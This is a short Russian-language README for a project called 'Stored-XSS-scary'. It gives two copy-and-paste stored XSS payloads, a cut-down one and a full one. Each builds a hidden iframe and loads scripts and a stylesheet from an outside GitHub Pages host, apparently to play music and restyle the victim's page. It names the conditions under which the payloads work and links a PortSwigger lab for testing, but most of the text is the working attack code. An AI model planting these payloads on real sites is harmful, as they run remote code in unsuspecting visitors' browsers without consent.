# Stored-XSS-scary

Код сработает только при наличии уязвимости stored XSS + сайт не будет блокировать загрузку внешних скриптов и стилей. <br>
Для теста можно запустить лабараторку в https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded.

------------------------------------------

Обрезанная версия (только запуск музыки):
> <script>var frame = document.createElement("iframe"); frame.style.display = "none"; document.body.appendChild(frame); frame.onload = function() { var script = document.createElement('script'); script.src = 'https://0-dayff13r.github.io/Stored-XSS-scary/start.js'; frame.contentWindow.document.head.appendChild(script)}</script>
<br>
Полная версия (музыка + CSS):
> <script>var frame = document.createElement("iframe"); frame.style.display = "none"; document.body.appendChild(frame); frame.onload = function() { var script = document.createElement('script'); script.src = 'https://0-dayff13r.github.io/Stored-XSS-scary/start.js'; frame.contentWindow.document.head.appendChild(script); var cssLink = document.createElement('link'); cssLink.rel = 'stylesheet'; cssLink.href = 'https://0-dayff13r.github.io/Stored-XSS-scary/styles.css'; document.head.appendChild(cssLink); var script2 = document.createElement('script'); script2.src = 'https://0-dayff13r.github.io/Stored-XSS-scary/script.js'; document.body.appendChild(script2);}</script>
